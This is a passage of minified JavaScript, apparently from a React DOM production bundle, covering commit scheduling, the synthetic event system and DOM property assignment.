                                G.nodeType === 1 && $.push({
                                    element: G,
                                    left: G.scrollLeft,
                                    top: G.scrollTop
                                });
                            for (typeof A.focus == "function" && A.focus(),
                            A = 0; A < $.length; A++) {
                                var X = $[A];
                                X.element.scrollLeft = X.left,
                                X.element.scrollTop = X.top
                            }
                        }
                        yu = !!om,
                        lm = om = null
                    } finally {
                        $e = f,
                        P.p = c,
                        T.T = a
                    }
                }
                i.current = r,
                zt = 2
            }
        }
        function Kv() {
            if (zt === 2) {
                zt = 0;
                var i = Sr
                  , r = va
                  , a = (r.flags & 8772) !== 0;
                if ((r.subtreeFlags & 8772) !== 0 || a) {
                    a = T.T,
                    T.T = null;
                    var c = P.p;
                    P.p = 2;
                    var f = $e;
                    $e |= 4;
                    try {
                        Tv(i, r.alternate, r)
                    } finally {
                        $e = f,
                        P.p = c,
                        T.T = a
                    }
                }
                zt = 3
            }
        }
        function Xv() {
            if (zt === 4 || zt === 3) {
                zt = 0,
                js();
                var i = Sr
                  , r = va
                  , a = ba
                  , c = Uv;
                (r.subtreeFlags & 10256) !== 0 || (r.flags & 10256) !== 0 ? zt = 5 : (zt = 0,
                va = Sr = null,
                Jv(i, i.pendingLanes));
                var f = i.pendingLanes;
                if (f === 0 && (xr = null),
                mf(a),
                r = r.stateNode,
                st && typeof st.onCommitFiberRoot == "function")
                    try {
                        st.onCommitFiberRoot(ct, r, void 0, (r.current.flags & 128) === 128)
                    } catch {}
                if (c !== null) {
                    r = T.T,
                    f = P.p,
                    P.p = 2,
                    T.T = null;
                    try {
                        for (var g = i.onRecoverableError, v = 0; v < c.length; v++) {
                            var A = c[v];
                            g(A.value, {
                                componentStack: A.stack
                            })
                        }
                    } finally {
                        T.T = r,
                        P.p = f
                    }
                }
                (ba & 3) !== 0 && su(),
                ci(i),
                f = i.pendingLanes,
                (a & 4194090) !== 0 && (f & 42) !== 0 ? i === Yh ? Wo++ : (Wo = 0,
                Yh = i) : Wo = 0,
                el(0)
            }
        }
        function Jv(i, r) {
            (i.pooledCacheLanes &= r) === 0 && (r = i.pooledCache,
            r != null && (i.pooledCache = null,
            No(r)))
        }
        function su(i) {
            return Zv(),
            Kv(),
            Xv(),
            $v()
        }
        function $v() {
            if (zt !== 5)
                return !1;
            var i = Sr
              , r = Qh;
            Qh = 0;
            var a = mf(ba)
              , c = T.T
              , f = P.p;
            try {
                P.p = 32 > a ? 32 : a,
                T.T = null,
                a = Vh,
                Vh = null;
                var g = Sr
                  , v = ba;
                if (zt = 0,
                va = Sr = null,
                ba = 0,
                ($e & 6) !== 0)
                    throw Error(s(331));
                var A = $e;
                if ($e |= 4,
                Dv(g.current),
                Ov(g, g.current, v, a),
                $e = A,
                el(0, !1),
                st && typeof st.onPostCommitFiberRoot == "function")
                    try {
                        st.onPostCommitFiberRoot(ct, g)
                    } catch {}
                return !0
            } finally {
                P.p = f,
                T.T = c,
                Jv(i, r)
            }
        }
        function Wv(i, r, a) {
            r = Nn(a, r),
            r = Sh(i.stateNode, r, 2),
            i = pr(i, r, 2),
            i !== null && (yo(i, 2),
            ci(i))
        }
        function it(i, r, a) {
            if (i.tag === 3)
                Wv(i, i, a);
            else
                for (; r !== null; ) {
                    if (r.tag === 3) {
                        Wv(r, i, a);
                        break
                    } else if (r.tag === 1) {
                        var c = r.stateNode;
                        if (typeof r.type.getDerivedStateFromError == "function" || typeof c.componentDidCatch == "function" && (xr === null || !xr.has(c))) {
                            i = Nn(a, i),
                            a = iv(2),
                            c = pr(r, a, 2),
                            c !== null && (rv(a, c, r, i),
                            yo(c, 2),
                            ci(c));
                            break
                        }
                    }
                    r = r.return
                }
        }
        function Jh(i, r, a) {
            var c = i.pingCache;
            if (c === null) {
                c = i.pingCache = new Qx;
                var f = new Set;
                c.set(r, f)
            } else
                f = c.get(r),
                f === void 0 && (f = new Set,
                c.set(r, f));
            f.has(a) || (zh = !0,
            f.add(a),
            i = Xx.bind(null, i, r, a),
            r.then(i, i))
        }
        function Xx(i, r, a) {
            var c = i.pingCache;
            c !== null && c.delete(r),
            i.pingedLanes |= i.suspendedLanes & a,
            i.warmLanes &= ~a,
            at === i && (qe & a) === a && (At === 4 || At === 3 && (qe & 62914560) === qe && 300 > gn() - Fh ? ($e & 2) === 0 && Aa(i, 0) : Gh |= a,
            ya === qe && (ya = 0)),
            ci(i)
        }
        function eb(i, r) {
            r === 0 && (r = X0()),
            i = na(i, r),
            i !== null && (yo(i, r),
            ci(i))
        }
        function Jx(i) {
            var r = i.memoizedState
              , a = 0;
            r !== null && (a = r.retryLane),
            eb(i, a)
        }
        function $x(i, r) {
            var a = 0;
            switch (i.tag) {
            case 13:
                var c = i.stateNode
                  , f = i.memoizedState;
                f !== null && (a = f.retryLane);
                break;
            case 19:
                c = i.stateNode;
                break;
            case 22:
                c = i.stateNode._retryCache;
                break;
            default:
                throw Error(s(314))
            }
            c !== null && c.delete(r),
            eb(i, a)
        }
        function Wx(i, r) {
            return Cn(i, r)
        }
        var au = null
          , _a = null
          , $h = !1
          , ou = !1
          , Wh = !1
          , us = 0;
        function ci(i) {
            i !== _a && i.next === null && (_a === null ? au = _a = i : _a = _a.next = i),
            ou = !0,
            $h || ($h = !0,
            tS())
        }
        function el(i, r) {
            if (!Wh && ou) {
                Wh = !0;
                do
                    for (var a = !1, c = au; c !== null; ) {
                        if (i !== 0) {
                            var f = c.pendingLanes;
                            if (f === 0)
                                var g = 0;
                            else {
                                var v = c.suspendedLanes
                                  , A = c.pingedLanes;
                                g = (1 << 31 - dt(42 | i) + 1) - 1,
                                g &= f & ~(v & ~A),
                                g = g & 201326741 ? g & 201326741 | 1 : g ? g | 2 : 0
                            }
                            g !== 0 && (a = !0,
                            rb(c, g))
                        } else
                            g = qe,
                            g = ri(c, c === at ? g : 0, c.cancelPendingCommit !== null || c.timeoutHandle !== -1),
                            (g & 3) === 0 || Yn(c, g) || (a = !0,
                            rb(c, g));
                        c = c.next
                    }
                while (a);
                Wh = !1
            }
        }
        function eS() {
            tb()
        }
        function tb() {
            ou = $h = !1;
            var i = 0;
            us !== 0 && (cS() && (i = us),
            us = 0);
            for (var r = gn(), a = null, c = au; c !== null; ) {
                var f = c.next
                  , g = nb(c, r);
                g === 0 ? (c.next = null,
                a === null ? au = f : a.next = f,
                f === null && (_a = a)) : (a = c,
                (i !== 0 || (g & 3) !== 0) && (ou = !0)),
                c = f
            }
            el(i)
        }
        function nb(i, r) {
            for (var a = i.suspendedLanes, c = i.pingedLanes, f = i.expirationTimes, g = i.pendingLanes & -62914561; 0 < g; ) {
                var v = 31 - dt(g)
                  , A = 1 << v
                  , C = f[v];
                C === -1 ? ((A & a) === 0 || (A & c) !== 0) && (f[v] = TE(A, r)) : C <= r && (i.expiredLanes |= A),
                g &= ~A
            }
            if (r = at,
            a = qe,
            a = ri(i, i === r ? a : 0, i.cancelPendingCommit !== null || i.timeoutHandle !== -1),
            c = i.callbackNode,
            a === 0 || i === r && (We === 2 || We === 9) || i.cancelPendingCommit !== null)
                return c !== null && c !== null && In(c),
                i.callbackNode = null,
                i.callbackPriority = 0;
            if ((a & 3) === 0 || Yn(i, a)) {
                if (r = a & -a,
                r === i.callbackPriority)
                    return r;
                switch (c !== null && In(c),
                mf(a)) {
                case 2:
                case 8:
                    a = K;
                    break;
                case 32:
                    a = Ps;
                    break;
                case 268435456:
                    a = Kt;
                    break;
                default:
                    a = Ps
                }
                return c = ib.bind(null, i),
                a = Cn(a, c),
                i.callbackPriority = r,
                i.callbackNode = a,
                r
            }
            return c !== null && c !== null && In(c),
            i.callbackPriority = 2,
            i.callbackNode = null,
            2
        }
        function ib(i, r) {
            if (zt !== 0 && zt !== 5)
                return i.callbackNode = null,
                i.callbackPriority = 0,
                null;
            var a = i.callbackNode;
            if (su() && i.callbackNode !== a)
                return null;
            var c = qe;
            return c = ri(i, i === at ? c : 0, i.cancelPendingCommit !== null || i.timeoutHandle !== -1),
            c === 0 ? null : (Pv(i, c, r),
            nb(i, gn()),
            i.callbackNode != null && i.callbackNode === a ? ib.bind(null, i) : null)
        }
        function rb(i, r) {
            if (su())
                return null;
            Pv(i, r, !0)
        }
        function tS() {
            dS(function() {
                ($e & 6) !== 0 ? Cn(po, eS) : tb()
            })
        }
        function em() {
            return us === 0 && (us = K0()),
            us
        }
        function sb(i) {
            return i == null || typeof i == "symbol" || typeof i == "boolean" ? null : typeof i == "function" ? i : vc("" + i)
        }
        function ab(i, r) {
            var a = r.ownerDocument.createElement("input");
            return a.name = r.name,
            a.value = r.value,
            i.id && a.setAttribute("form", i.id),
            r.parentNode.insertBefore(a, r),
            i = new FormData(i),
            a.parentNode.removeChild(a),
            i
        }
        function nS(i, r, a, c, f) {
            if (r === "submit" && a && a.stateNode === f) {
                var g = sb((f[sn] || null).action)
                  , v = c.submitter;
                v && (r = (r = v[sn] || null) ? sb(r.formAction) : v.getAttribute("formAction"),
                r !== null && (g = r,
                v = null));
                var A = new _c("action","action",null,c,f);
                i.push({
                    event: A,
                    listeners: [{
                        instance: null,
                        listener: function() {
                            if (c.defaultPrevented) {
                                if (us !== 0) {
                                    var C = v ? ab(f, v) : new FormData(f);
                                    Ah(a, {
                                        pending: !0,
                                        data: C,
                                        method: f.method,
                                        action: g
                                    }, null, C)
                                }
                            } else
                                typeof g == "function" && (A.preventDefault(),
                                C = v ? ab(f, v) : new FormData(f),
                                Ah(a, {
                                    pending: !0,
                                    data: C,
                                    method: f.method,
                                    action: g
                                }, g, C))
                        },
                        currentTarget: f
                    }]
                })
            }
        }
        for (var tm = 0; tm < Pf.length; tm++) {
            var nm = Pf[tm]
              , iS = nm.toLowerCase()
              , rS = nm[0].toUpperCase() + nm.slice(1);
            Zn(iS, "on" + rS)
        }
        Zn(Pg, "onAnimationEnd"),
        Zn(Hg, "onAnimationIteration"),
        Zn(zg, "onAnimationStart"),
        Zn("dblclick", "onDoubleClick"),
        Zn("focusin", "onFocus"),
        Zn("focusout", "onBlur"),
        Zn(wx, "onTransitionRun"),
        Zn(_x, "onTransitionStart"),
        Zn(Ex, "onTransitionCancel"),
        Zn(Gg, "onTransitionEnd"),
        Vs("onMouseEnter", ["mouseout", "mouseover"]),
        Vs("onMouseLeave", ["mouseout", "mouseover"]),
        Vs("onPointerEnter", ["pointerout", "pointerover"]),
        Vs("onPointerLeave", ["pointerout", "pointerover"]),
        Zr("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
        Zr("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
        Zr("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
        Zr("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
        Zr("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
        Zr("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
        var tl = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
          , sS = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(tl));
        function ob(i, r) {
            r = (r & 4) !== 0;
            for (var a = 0; a < i.length; a++) {
                var c = i[a]
                  , f = c.event;
                c = c.listeners;
                e: {
                    var g = void 0;
                    if (r)
                        for (var v = c.length - 1; 0 <= v; v--) {
                            var A = c[v]
                              , C = A.instance
                              , j = A.currentTarget;
                            if (A = A.listener,
                            C !== g && f.isPropagationStopped())
                                break e;
                            g = A,
                            f.currentTarget = j;
                            try {
                                g(f)
                            } catch (V) {
                                Zc(V)
                            }
                            f.currentTarget = null,
                            g = C
                        }
                    else
                        for (v = 0; v < c.length; v++) {
                            if (A = c[v],
                            C = A.instance,
                            j = A.currentTarget,
                            A = A.listener,
                            C !== g && f.isPropagationStopped())
                                break e;
                            g = A,
                            f.currentTarget = j;
                            try {
                                g(f)
                            } catch (V) {
                                Zc(V)
                            }
                            f.currentTarget = null,
                            g = C
                        }
                }
            }
        }
        function He(i, r) {
            var a = r[pf];
            a === void 0 && (a = r[pf] = new Set);
            var c = i + "__bubble";
            a.has(c) || (lb(r, i, 2, !1),
            a.add(c))
        }
        function im(i, r, a) {
            var c = 0;
            r && (c |= 4),
            lb(a, i, c, r)
        }
        var lu = "_reactListening" + Math.random().toString(36).slice(2);
        function rm(i) {
            if (!i[lu]) {
                i[lu] = !0,
                tg.forEach(function(a) {
                    a !== "selectionchange" && (sS.has(a) || im(a, !1, i),
                    im(a, !0, i))
                });
                var r = i.nodeType === 9 ? i : i.ownerDocument;
                r === null || r[lu] || (r[lu] = !0,
                im("selectionchange", !1, r))
            }
        }
        function lb(i, r, a, c) {
            switch (Ob(r)) {
            case 2:
                var f = OS;
                break;
            case 8:
                f = NS;
                break;
            default:
                f = vm
            }
            a = f.bind(null, r, a, i),
            f = void 0,
            !Tf || r !== "touchstart" && r !== "touchmove" && r !== "wheel" || (f = !0),
            c ? f !== void 0 ? i.addEventListener(r, a, {
                capture: !0,
                passive: f
            }) : i.addEventListener(r, a, !0) : f !== void 0 ? i.addEventListener(r, a, {
                passive: f
            }) : i.addEventListener(r, a, !1)
        }
        function sm(i, r, a, c, f) {
            var g = c;
            if ((r & 1) === 0 && (r & 2) === 0 && c !== null)
                e: for (; ; ) {
                    if (c === null)
                        return;
                    var v = c.tag;
                    if (v === 3 || v === 4) {
                        var A = c.stateNode.containerInfo;
                        if (A === f)
                            break;
                        if (v === 4)
                            for (v = c.return; v !== null; ) {
                                var C = v.tag;
                                if ((C === 3 || C === 4) && v.stateNode.containerInfo === f)
                                    return;
                                v = v.return
                            }
                        for (; A !== null; ) {
                            if (v = qs(A),
                            v === null)
                                return;
                            if (C = v.tag,
                            C === 5 || C === 6 || C === 26 || C === 27) {
                                c = g = v;
                                continue e
                            }
                            A = A.parentNode
                        }
                    }
                    c = c.return
                }
            pg(function() {
                var j = g
                  , V = xf(a)
                  , $ = [];
                e: {
                    var H = qg.get(i);
                    if (H !== void 0) {
                        var G = _c
                          , Te = i;
                        switch (i) {
                        case "keypress":
                            if (Ac(a) === 0)
                                break e;
                        case "keydown":
                        case "keyup":
                            G = WE;
                            break;
                        case "focusin":
                            Te = "focus",
                            G = If;
                            break;
                        case "focusout":
                            Te = "blur",
                            G = If;
                            break;
                        case "beforeblur":
                        case "afterblur":
                            G = If;
                            break;
                        case "click":
                            if (a.button === 2)
                                break e;
                        case "auxclick":
                        case "dblclick":
                        case "mousedown":
                        case "mousemove":
                        case "mouseup":
                        case "mouseout":
                        case "mouseover":
                        case "contextmenu":
                            G = vg;
                            break;
                        case "drag":
                        case "dragend":
                        case "dragenter":
                        case "dragexit":
                        case "dragleave":
                        case "dragover":
                        case "dragstart":
                        case "drop":
                            G = zE;
                            break;
                        case "touchcancel":
                        case "touchend":
                        case "touchmove":
                        case "touchstart":
                            G = nx;
                            break;
                        case Pg:
                        case Hg:
                        case zg:
                            G = FE;
                            break;
                        case Gg:
                            G = rx;
                            break;
                        case "scroll":
                        case "scrollend":
                            G = PE;
                            break;
                        case "wheel":
                            G = ax;
                            break;
                        case "copy":
                        case "cut":
                        case "paste":
                            G = VE;
                            break;
                        case "gotpointercapture":
                        case "lostpointercapture":
                        case "pointercancel":
                        case "pointerdown":
                        case "pointermove":
                        case "pointerout":
                        case "pointerover":
                        case "pointerup":
                            G = Ag;
                            break;
                        case "toggle":
                        case "beforetoggle":
                            G = lx
                        }
                        var we = (r & 4) !== 0
                          , nt = !we && (i === "scroll" || i === "scrollend")
                          , M = we ? H !== null ? H + "Capture" : null : H;
                        we = [];
                        for (var N = j, U; N !== null; ) {
                            var X = N;
                            if (U = X.stateNode,
                            X = X.tag,
                            X !== 5 && X !== 26 && X !== 27 || U === null || M === null || (X = Ao(N, M),
                            X != null && we.push(nl(N, X, U))),
                            nt)
                                break;
                            N = N.return
                        }
                        0 < we.length && (H = new G(H,Te,null,a,V),
                        $.push({
                            event: H,
                            listeners: we
                        }))
                    }
                }
                if ((r & 7) === 0) {
                    e: {
                        if (H = i === "mouseover" || i === "pointerover",
                        G = i === "mouseout" || i === "pointerout",
                        H && a !== Ef && (Te = a.relatedTarget || a.fromElement) && (qs(Te) || Te[Gs]))
                            break e;
                        if ((G || H) && (H = V.window === V ? V : (H = V.ownerDocument) ? H.defaultView || H.parentWindow : window,
                        G ? (Te = a.relatedTarget || a.toElement,
                        G = j,
                        Te = Te ? qs(Te) : null,
                        Te !== null && (nt = l(Te),
                        we = Te.tag,
                        Te !== nt || we !== 5 && we !== 27 && we !== 6) && (Te = null)) : (G = null,
                        Te = j),
                        G !== Te)) {
                            if (we = vg,
                            X = "onMouseLeave",
                            M = "onMouseEnter",
                            N = "mouse",
                            (i === "pointerout" || i === "pointerover") && (we = Ag,
                            X = "onPointerLeave",
                            M = "onPointerEnter",
                            N = "pointer"),
                            nt = G == null ? H : bo(G),
                            U = Te == null ? H : bo(Te),
                            H = new we(X,N + "leave",G,a,V),
                            H.target = nt,
                            H.relatedTarget = U,
                            X = null,
                            qs(V) === j && (we = new we(M,N + "enter",Te,a,V),
                            we.target = U,
                            we.relatedTarget = nt,
                            X = we),
                            nt = X,
                            G && Te)
                                t: {
                                    for (we = G,
                                    M = Te,
                                    N = 0,
                                    U = we; U; U = Ea(U))
                                        N++;
                                    for (U = 0,
                                    X = M; X; X = Ea(X))
                                        U++;
                                    for (; 0 < N - U; )
                                        we = Ea(we),
                                        N--;
                                    for (; 0 < U - N; )
                                        M = Ea(M),
                                        U--;
                                    for (; N--; ) {
                                        if (we === M || M !== null && we === M.alternate)
                                            break t;
                                        we = Ea(we),
                                        M = Ea(M)
                                    }
                                    we = null
                                }
                            else
                                we = null;
                            G !== null && cb($, H, G, we, !1),
                            Te !== null && nt !== null && cb($, nt, Te, we, !0)
                        }
                    }
                    e: {
                        if (H = j ? bo(j) : window,
                        G = H.nodeName && H.nodeName.toLowerCase(),
                        G === "select" || G === "input" && H.type === "file")
                            var me = Bg;
                        else if (Tg(H))
                            if (Cg)
                                me = vx;
                            else {
                                me = gx;
                                var Ue = px
                            }
                        else
                            G = H.nodeName,
                            !G || G.toLowerCase() !== "input" || H.type !== "checkbox" && H.type !== "radio" ? j && _f(j.elementType) && (me = Bg) : me = yx;
                        if (me && (me = me(i, j))) {
                            Rg($, me, a, V);
                            break e
                        }
                        Ue && Ue(i, H, j),
                        i === "focusout" && j && H.type === "number" && j.memoizedProps.value != null && wf(H, "number", H.value)
                    }
                    switch (Ue = j ? bo(j) : window,
                    i) {
                    case "focusin":
                        (Tg(Ue) || Ue.contentEditable === "true") && (Ws = Ue,
                        Lf = j,
                        Bo = null);
                        break;
                    case "focusout":
                        Bo = Lf = Ws = null;
                        break;
                    case "mousedown":
                        Uf = !0;
                        break;
                    case "contextmenu":
                    case "mouseup":
                    case "dragend":
                        Uf = !1,
                        Ug($, a, V);
                        break;
                    case "selectionchange":
                        if (Ax)
                            break;
                    case "keydown":
                    case "keyup":
                        Ug($, a, V)
                    }
                    var ge;
                    if (Of)
                        e: {
                            switch (i) {
                            case "compositionstart":
                                var _e = "onCompositionStart";
                                break e;
                            case "compositionend":
                                _e = "onCompositionEnd";
                                break e;
                            case "compositionupdate":
                                _e = "onCompositionUpdate";
                                break e
                            }
                            _e = void 0
                        }
                    else
                        $s ? xg(i, a) && (_e = "onCompositionEnd") : i === "keydown" && a.keyCode === 229 && (_e = "onCompositionStart");
                    _e && (wg && a.locale !== "ko" && ($s || _e !== "onCompositionStart" ? _e === "onCompositionEnd" && $s && (ge = gg()) : (dr = V,
                    Rf = "value"in dr ? dr.value : dr.textContent,
                    $s = !0)),
                    Ue = cu(j, _e),
                    0 < Ue.length && (_e = new bg(_e,i,null,a,V),
                    $.push({
                        event: _e,
                        listeners: Ue
                    }),
                    ge ? _e.data = ge : (ge = Sg(a),
                    ge !== null && (_e.data = ge)))),
                    (ge = ux ? dx(i, a) : fx(i, a)) && (_e = cu(j, "onBeforeInput"),
                    0 < _e.length && (Ue = new bg("onBeforeInput","beforeinput",null,a,V),
                    $.push({
                        event: Ue,
                        listeners: _e
                    }),
                    Ue.data = ge)),
                    nS($, i, j, a, V)
                }
                ob($, r)
            })
        }
        function nl(i, r, a) {
            return {
                instance: i,
                listener: r,
                currentTarget: a
            }
        }
        function cu(i, r) {
            for (var a = r + "Capture", c = []; i !== null; ) {
                var f = i
                  , g = f.stateNode;
                if (f = f.tag,
                f !== 5 && f !== 26 && f !== 27 || g === null || (f = Ao(i, a),
                f != null && c.unshift(nl(i, f, g)),
                f = Ao(i, r),
                f != null && c.push(nl(i, f, g))),
                i.tag === 3)
                    return c;
                i = i.return
            }
            return []
        }
        function Ea(i) {
            if (i === null)
                return null;
            do
                i = i.return;
            while (i && i.tag !== 5 && i.tag !== 27);
            return i || null
        }
        function cb(i, r, a, c, f) {
            for (var g = r._reactName, v = []; a !== null && a !== c; ) {
                var A = a
                  , C = A.alternate
                  , j = A.stateNode;
                if (A = A.tag,
                C !== null && C === c)
                    break;
                A !== 5 && A !== 26 && A !== 27 || j === null || (C = j,
                f ? (j = Ao(a, g),
                j != null && v.unshift(nl(a, j, C))) : f || (j = Ao(a, g),
                j != null && v.push(nl(a, j, C)))),
                a = a.return
            }
            v.length !== 0 && i.push({
                event: r,
                listeners: v
            })
        }
        var aS = /\r\n?/g
          , oS = /\u0000|\uFFFD/g;
        function ub(i) {
            return (typeof i == "string" ? i : "" + i).replace(aS, `
`).replace(oS, "")
        }
        function db(i, r) {
            return r = ub(r),
            ub(i) === r
        }
        function uu() {}
        function tt(i, r, a, c, f, g) {
            switch (a) {
            case "children":
                typeof c == "string" ? r === "body" || r === "textarea" && c === "" || Ks(i, c) : (typeof c == "number" || typeof c == "bigint") && r !== "body" && Ks(i, "" + c);
                break;
            case "className":
                pc(i, "class", c);
                break;
            case "tabIndex":
                pc(i, "tabindex", c);
                break;
            case "dir":
            case "role":
            case "viewBox":
            case "width":
            case "height":
                pc(i, a, c);
                break;
            case "style":
                hg(i, c, g);
                break;
            case "data":
                if (r !== "object") {
                    pc(i, "data", c);
                    break
                }
            case "src":
            case "href":
                if (c === "" && (r !== "a" || a !== "href")) {
                    i.removeAttribute(a);
                    break
                }
                if (c == null || typeof c == "function" || typeof c == "symbol" || typeof c == "boolean") {
                    i.removeAttribute(a);
                    break
                }
                c = vc("" + c),
                i.setAttribute(a, c);
                break;
            case "action":
            case "formAction":
                if (typeof c == "function") {
                    i.setAttribute(a, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
                    break
                } else
                    typeof g == "function" && (a === "formAction" ? (r !== "input" && tt(i, r, "name", f.name, f, null),
                    tt(i, r, "formEncType", f.formEncType, f, null),
                    tt(i, r, "formMethod", f.formMethod, f, null),
                    tt(i, r, "formTarget", f.formTarget, f, null)) : (tt(i, r, "encType", f.encType, f, null),
                    tt(i, r, "method", f.method, f, null),
                    tt(i, r, "target", f.target, f, null)));
                if (c == null || typeof c == "symbol" || typeof c == "boolean") {
                    i.removeAttribute(a);
                    break
                }
                c = vc("" + c),
                i.setAttribute(a, c);
                break;
            case "onClick":
                c != null && (i.onclick = uu);
                break;
            case "onScroll":
                c != null && He("scroll", i);
                break;
            case "onScrollEnd":
                c != null && He("scrollend", i);
                break;
            case "dangerouslySetInnerHTML":
                if (c != null) {
                    if (typeof c != "object" || !("__html"in c))
                        throw Error(s(61));
                    if (a = c.__html,
                    a != null) {
                        if (f.children != null)
                            throw Error(s(60));
                        i.innerHTML = a
                    }
                }
                break;
            case "multiple":
                i.multiple = c && typeof c != "function" && typeof c != "symbol";
                break;
            case "muted":
                i.muted = c && typeof c != "function" && typeof c != "symbol";
                break;
            case "suppressContentEditableWarning":
            case "suppressHydrationWarning":
            case "defaultValue":
            case "defaultChecked":
            case "innerHTML":
            case "ref":
                break;
            case "autoFocus":
                break;
            case "xlinkHref":
                if (c == null || typeof c == "function" || typeof c == "boolean" || typeof c == "symbol") {
                    i.removeAttribute("xlink:href");
                    break
                }
                a = vc("" + c),
                i.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", a);
                break;
            case "contentEditable":
            case "spellCheck":
            case "draggable":
            case "value":
            case "autoReverse":
            case "externalResourcesRequired":
            case "focusable":
            case "preserveAlpha":
                c != null && typeof c != "function" && typeof c != "symbol" ? i.setAttribute(a, "" + c) : i.removeAttribute(a);
                break;
            case "inert":
            case "allowFullScreen":
            case "async":
            case "autoPlay":
            case "controls":
            case "default":
            case "defer":
            case "disabled":
            case "disablePictureInPicture":
            case "disableRemotePlayback":
            case "formNoValidate":
            case "hidden":
            case "loop":
            case "noModule":
            case "noValidate":
            case "open":
            case "playsInline":
            case "readOnly":
            case "required":
            case "reversed":
            case "scoped":
            case "seamless":
            case "itemScope":
                c && typeof c != "function" && typeof c != "symbol" ? i.setAttribute(a, "") : i.removeAttribute(a);
                break;
            case "capture":
            case "download":
                c === !0 ? i.setAttribute(a, "") : c !== !1 && c != null && typeof c != "function" && typeof c != "symbol" ? i.setAttribute(a, c) : i.removeAttribute(a);
                break;
            case "cols":
            case "rows":
            case "size":
            case "span":
                c != null && typeof c != "function" && typeof c != "symbol" && !isNaN(c) && 1 <= c ? i.setAttribute(a, c) : i.removeAttribute(a);
                break;
            case "rowSpan":
            case "start":
                c == null || typeof c == "function" || typeof c == "symbol" || isNaN(c) ? i.removeAttribute(a) : i.setAttribute(a, c);
                break;
            case "popover":
                He("beforetoggle", i),
                He("toggle", i),
                mc(i, "popover", c);
                break;
            case "xlinkActuate":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:actuate", c);
                break;
            case "xlinkArcrole":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:arcrole", c);
                break;
            case "xlinkRole":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:role", c);
                break;
            case "xlinkShow":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:show", c);
                break;
            case "xlinkTitle":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:title", c);
                break;
            case "xlinkType":
                Ti(i, "http://www.w3.org/1999/xlink", "xlink:type", c);
                break;
            case "xmlBase":
                Ti(i, "http://www.w3.org/XML/1998/namespace", "xml:base", c);
                break;
            case "xmlLang":
                Ti(i, "http://www.w3.org/XML/1998/namespace", "xml:lang", c);
                break;
            case "xmlSpace":
                Ti(i, "http://www.w3.org/XML/1998/namespace", "xml:space", c);
                break;
            case "is":
                mc(i, "is", c);
                break;
            case "innerText":
            case "textContent":
                break;
            default:
                (!(2 < a.length) || a[0] !== "o" && a[0] !== "O" || a[1] !== "n" && a[1] !== "N") && (a = UE.get(a) || a,
                mc(i, a, c))
            }
        }
        function am(i, r, a, c, f, g) {
            switch (a) {
            case "style":
                hg(i, c, g);
                break;
            case "dangerouslySetInnerHTML":
                if (c != null) {
                    if (typeof c != "object" || !("__html"in c))
                        throw Error(s(61));
                    if (a = c.__html,
                    a != null) {
                        if (f.children != null)
                            throw Error(s(60));
                        i.innerHTML = a
                    }
                }
                break;
            case "children":
                typeof c == "string" ? Ks(i, c) : (typeof c == "number" || typeof c == "bigint") && Ks(i, "" + c);
                break;
            case "onScroll":
                c != null && He("scroll", i);
                break;
            case "onScrollEnd":
                c != null && He("scrollend", i);
                break;
            case "onClick":
                c != null && (i.onclick = uu);
                break;
            case "suppressContentEditableWarning":
            case "suppressHydrationWarning":
            case "innerHTML":
            case "ref":
                break;
            case "innerText":
            case "textContent":
                break;
            default:
                if (!ng.hasOwnProperty(a))
                    e: {
                        if (a[0] === "o" && a[1] === "n" && (f = a.endsWith("Capture"),
                        r = a.slice(2, f ? a.length - 7 : void 0),
                        g = i[sn] || null,
                        g = g != null ? g[a] : null,
                        typeof g == "function" && i.removeEventListener(r, g, f),
                        typeof c == "function")) {
                            typeof g != "function" && g !== null && (a in i ? i[a] = null : i.hasAttribute(a) && i.removeAttribute(a)),
                            i.addEventListener(r, c, f);
                            break e
                        }
                        a in i ? i[a] = c : c === !0 ? i.setAttribute(a, "") : mc(i, a, c)
                    }
            }
        }
        function Gt(i, r, a) {
            switch (r) {
            case "div":
            case "span":
            case "svg":
            case "path":
            case "a":
            case "g":
            case "p":
            case "li":
                break;
            case "img":
                He("error", i),
                He("load", i);
                var c = !1, f = !1, g;
                for (g in a)
                    if (a.hasOwnProperty(g)) {
                        var v = a[g];
                        if (v != null)
                            switch (g) {
                            case "src":
                                c = !0;
                                break;
                            case "srcSet":
                                f = !0;
                                break;
                            case "children":
                            case "dangerouslySetInnerHTML":
                                throw Error(s(137, r));
                            default:
                                tt(i, r, g, v, a, null)
                            }
                    }
                f && tt(i, r, "srcSet", a.srcSet, a, null),
                c && tt(i, r, "src", a.src, a, null);
                return;
            case "input":
                He("invalid", i);
                var A = g = v = f = null
                  , C = null
                  , j = null;
                for (c in a)
                    if (a.hasOwnProperty(c)) {
                        var V = a[c];
                        if (V != null)
                            switch (c) {
                            case "name":
                                f = V;
                                break;
                            case "type":
                                v = V;
                                break;
                            case "checked":
                                C = V;
                                break;
                            case "defaultChecked":
                                j = V;
                                break;
                            case "value":
                                g = V;
                                break;
                            case "defaultValue":
                                A = V;
                                break;
                            case "children":
                            case "dangerouslySetInnerHTML":
                                if (V != null)
                                    throw Error(s(137, r));
                                break;
                            default:
                                tt(i, r, c, V, a, null)
                            }
                    }
                cg(i, g, A, C, j, v, f, !1),
                gc(i);
                return;
            case "select":
                He("invalid", i),
                c = v = g = null;
                for (f in a)
                    if (a.hasOwnProperty(f) && (A = a[f],
                    A != null))
                        switch (f) {
                        case "value":
                            g = A;
                            break;
                        case "defaultValue":
                            v = A;
                            break;
